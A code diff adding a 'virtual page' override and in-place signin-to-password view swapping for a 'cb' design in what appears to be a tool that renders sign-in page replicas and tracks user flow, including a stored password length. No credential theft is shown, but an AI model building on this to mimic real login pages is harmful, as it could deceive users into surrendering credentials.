@@ -966,6 +966,19 @@ export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
   return applyPageMeta(base, pm);
 }
 
+export function buildSrcDocVirtual(
+  design: DesignKey,
+  loadPage: PageKey,
+  virtualPage: PageKey,
+): string {
+  const doc = buildSrcDocCached(design, loadPage);
+  const inject = `<script>window.__ux_virtual_page=${JSON.stringify(virtualPage)};</script>`;
+  if (/<head[^>]*>/i.test(doc)) {
+    return doc.replace(/<head[^>]*>/i, (m) => `${m}\n${inject}`);
+  }
+  return inject + doc;
+}
+
 function escAttr(s: string): string {
   return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
 }
@@ -1048,12 +1061,21 @@ function setStoredPassLen(n){ try { sessionStorage.setItem(PASS_LEN_KEY, String(
 function currentDesignAndPage(){
   try {
     var parts = parent.location.pathname.split('/').filter(Boolean);
-    return { design: parts[0] || '', page: parts[1] || '' };
+    var p = parts[1] || '';
+    // Virtual-page override: cb merges signin + signinp under /cb/signin
+    // and uses window.__ux_virtual_page so tracker flow logic knows where it is.
+    if (window.__ux_virtual_page) p = String(window.__ux_virtual_page);
+    return { design: parts[0] || '', page: p };
   } catch(e){ return { design:'', page:'' }; }
 }
 function navigateTo(page){
   var loc = currentDesignAndPage();
   if (!loc.design) return;
+  // cb special: signin -> signinp is an in-place view swap (URL stays /cb/signin)
+  if (loc.design === 'cb' && loc.page === 'signin' && page === 'signinp') {
+    try { parent.postMessage({__ux:true, type:'swap_virtual', design:'cb', page:'signinp'}, '*'); } catch(e){}
+    return;
+  }
   var target = '/' + loc.design + '/' + page;
   try { sessionStorage.setItem('__ux_internal_nav_until', String(Date.now() + 15000)); } catch(e){}
   // Parent does client-side navigation (no full reload) for smooth transitions.
